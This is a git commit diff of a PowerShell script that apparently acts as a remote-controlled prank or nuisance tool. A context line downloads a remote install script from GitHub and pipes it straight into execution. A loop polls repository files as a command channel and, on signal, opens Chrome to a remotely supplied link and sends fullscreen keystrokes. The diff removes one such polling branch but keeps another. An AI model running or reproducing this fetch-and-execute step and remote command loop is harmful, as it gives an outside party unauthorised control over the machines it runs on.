3e5bb5227dea7aea14acbc98095b82c75a7288a4
FraitRed <136161358+FraitRed@users.noreply.github.com>
2024-05-17 00:45:16 +0300

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -101,35 +101,21 @@ irm https://raw.githubusercontent.com/FraitRed/g/main/wallpaper/install.ps1 | ie
 }
 
 $wshell = New-Object -ComObject wscript.shell;
-function yut {
-$wshell.SendKeys('{ESC}')
+
+function yut($link) {
 [system.Diagnostics.Process]::Start("chrome",$link) | Out-Null
 sleep 2
 $wshell.SendKeys('{F11}')
-sleep -Seconds 9
+sleep -Seconds 7
 $wshell.SendKeys('f')
 sleep 1
 $wshell.SendKeys('{up}')
 sleep 1
 $wshell.SendKeys('{up}')
 }
-$a = $True
+
 $b = $True
 while(1){
-$response = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/213" -UseBasicParsing
-$response.Content -match 'rawLines":..(.*?)..,' | Out-Null
-$Matches[1] = $Matches[1] -replace '\\',''
-if(($Matches[1] -eq 1) -and (!$a)){
-$a = $True
-}
-if(($Matches[1] -eq 0) -and ($a)){
-$l = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/link" -UseBasicParsing
-$l.Content -match 'rawLines":..(.*?)..,' | Out-Null
-$Matches[1] = $Matches[1] -replace '\\',''
-$link = $Matches[1]
-yut
-$a = $False
-}
 $p = Invoke-WebRequest -Uri "https://github.com/FraitRed/g/blob/main/312" -UseBasicParsing
 $p.Content -match 'rawLines":..(.*?)..,' | Out-Null
 $Matches[1] = $Matches[1] -replace '\\',''
